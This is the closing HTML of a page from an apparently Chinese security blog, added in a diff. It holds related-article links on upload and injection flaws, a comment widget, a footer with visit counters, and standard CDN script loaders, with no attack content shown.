+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/ym1ku8fe/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png" loading="lazy" data-key="ym1ku8fe" data-hash="https://w.wallhaven.cc/full/jx/wallhaven-jxdvpp.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">佛学的魔改.net Ueditor</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/iqi0ucr4/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg" loading="lazy" data-key="iqi0ucr4" data-hash="https://w.wallhaven.cc/full/p9/wallhaven-p97q3p.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">记一次任意文件上传</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/3dvjkhwx/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg" loading="lazy" data-key="3dvjkhwx" data-hash="https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">记一个奇葩的上传点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/mwcslpwe/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg" loading="lazy" data-key="mwcslpwe" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2y2g66.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">一个项目中遇到的奇葩站点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xaef7i9f/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" data-key="xaef7i9f" data-hash="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">意外性的发现一套cms的注入漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="360rce/blog-comment"
+        issue-term="pathname"
+        
+        label="utterances"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
+    </section>
+    <i class="powerby">
+    <span id="busuanzi_container_site_pv">
+        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
+    </span>&nbsp;
+    <span id="busuanzi_container_site_uv">
+        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </i>
+
+
+</footer>
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+    </body>
+</html>
